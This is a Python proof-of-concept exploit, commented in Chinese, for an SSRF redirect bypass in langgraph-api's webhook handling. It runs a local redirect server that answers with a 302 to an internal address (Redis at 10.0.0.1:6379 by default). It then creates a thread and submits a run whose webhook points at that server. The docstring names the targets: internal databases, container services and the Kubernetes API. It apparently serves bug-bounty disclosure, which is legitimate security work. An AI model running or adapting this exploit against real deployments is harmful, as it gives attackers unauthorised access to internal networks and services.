#!/usr/bin/env python3
"""
LangGraph API SSRF 重定向绕过 PoC
目标版本: langgraph-api v0.10.0

漏洞概要:
  SSRFPolicy.block_private_ips=False 为默认值，webhook 客户端 follow_redirects=True。
  攻击者将 webhook 设为自己的域名，302 重定向到内网 IP → SSRF。
  block_cloud_metadata=True 只拦 169.254.x.x，不拦 10.x/172.16-31.x/192.168.x。

影响:
  - 内网 Redis/Memcached/数据库未授权访问
  - 容器内部服务扫描
  - K8s API server (需 block_k8s_internal 配置)

复现:
  python3 ssrf_bypass_poc.py --target http://localhost:8123 --webhook http://your-server.com/redirect
"""

import argparse
import signal
import sys
import threading
import time
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler

import requests


class RedirectServer(BaseHTTPRequestHandler):
    """模拟攻击者的 HTTP 服务器：收到请求后 302 重定向到目标内网地址"""

    redirect_target = "http://10.0.0.1:6379"  # 默认内网 Redis
    hit_count = 0

    def do_GET(self):
        RedirectServer.hit_count += 1
        self.send_response(302)
        self.send_header("Location", self.redirect_target)
        self.end_headers()

    def do_POST(self):
        RedirectServer.hit_count += 1
        self.send_response(302)
        self.send_header("Location", self.redirect_target)
        self.end_headers()

    def log_message(self, *a):
        pass


def main():
    parser = argparse.ArgumentParser(description="LangGraph API SSRF bypass PoC")
    parser.add_argument("--target", default="http://localhost:8123", help="LangGraph API 地址")
    parser.add_argument("--redirect-port", type=int, default=18888, help="重定向服务器端口")
    parser.add_argument("--webhook", help="自定义 webhook URL（覆盖本地重定向服务器）")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    public_url = args.webhook

    if public_url:
        print(f"[*] 使用自定义 webhook: {public_url}")
        print(f"[*] 请确保你的服务器返回 302 Location: <内网目标>")
    else:
        # 启动本地重定向服务器
        local_port = args.redirect_port
        server = HTTPServer(("0.0.0.0", local_port), RedirectServer)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        public_url = f"http://host.docker.internal:{local_port}/redirect"
        print(f"[*] 重定向服务器启动在 0.0.0.0:{local_port}")
        print(f"[*] Webhook URL: {public_url}")
        print(f"[*] 重定向目标: {RedirectServer.redirect_target}")
        print(f"[*] 提示：如果目标在 docker 中，可能需要调整网络模式")
        print()

    # 1. 验证 API 可达
    print("[1/3] 检查 API 可达性...")
    try:
        r = requests.get(f"{target}/ok", timeout=5)
        print(f"  GET /ok → {r.status_code}")
    except Exception as e:
        print(f"  FAILED: {e}")
        print("  请确认目标正在运行。启动: docker run -d -p 8123:8123 langgraph/langgraph-api")
        sys.exit(1)

    # 2. 创建 thread
    print()
    print("[2/3] 创建 thread...")
    thread_id = str(uuid.uuid4())
    try:
        r = requests.post(
            f"{target}/threads",
            json={"thread_id": thread_id},
            timeout=10,
        )
        print(f"  POST /threads → {r.status_code}")
        if r.status_code not in (200, 201):
            print(f"  响应: {r.text[:200]}")
            # 有些版本可能不允许自定义 thread_id，试试自动生成
            r2 = requests.post(f"{target}/threads", json={}, timeout=10)
            print(f"  POST /threads (auto) → {r2.status_code}")
            if r2.status_code in (200, 201):
                thread_id = r2.json().get("thread_id", thread_id)
    except Exception as e:
        print(f"  创建 thread 失败: {e}")

    # 3. 发起带 webhook 的 run
    print()
    print("[3/3] 发送带 webhook 的 run 请求...")
    print(f"  Thread ID: {thread_id}")
    print(f"  Webhook: {public_url}")

    run_payload = {
        "assistant_id": "default",
        "input": {
            "messages": [{"role": "user", "content": "hello"}],
        },
        "webhook": public_url,
    }

    try:
        r = requests.post(
            f"{target}/threads/{thread_id}/runs",
            json=run_payload,
            timeout=15,
        )
        print(f"  POST /threads/{thread_id}/runs → {r.status_code}")
        print(f"  响应: {r.text[:300]}")

        if r.status_code == 422 and "blocked" in r.text.lower():
            print()
            print("  [-] SSRF 策略生效，webhook 被拦截")
            print(f"  错误: {r.text[:200]}")
        elif r.status_code in (200, 201):
            print()
            print("  [+] webhook 已接受！SSRF 可能成功")
            if not args.webhook:
                time.sleep(2)
                if RedirectServer.hit_count > 0:
                    print(f"  [+] 重定向服务器收到 {RedirectServer.hit_count} 次请求")
                    print("  [+] SSRF BYPASS CONFIRMED!")
                else:
                    print("  [?] 重定向服务器未收到请求")
        else:
            print(f"  [?] 未知响应: {r.status_code}")
            print(f"  {r.text[:200]}")

    except requests.exceptions.ReadTimeout:
        print("  [-] 请求超时")
    except Exception as e:
        print(f"  [-] 错误: {e}")

    print()
    print("=" * 60)
    print("  扫描结果:")
    print(f"  SSRFPolicy.block_private_ips = False (默认)")
    print(f"  SSRFPolicy.block_localhost = False (默认)")
    print("  详情: SSRF redirect bypass (CWE-918)")
    print("  提报: https://huntr.com/bounties/disclose/")
    print("=" * 60)


if __name__ == "__main__":
    main()
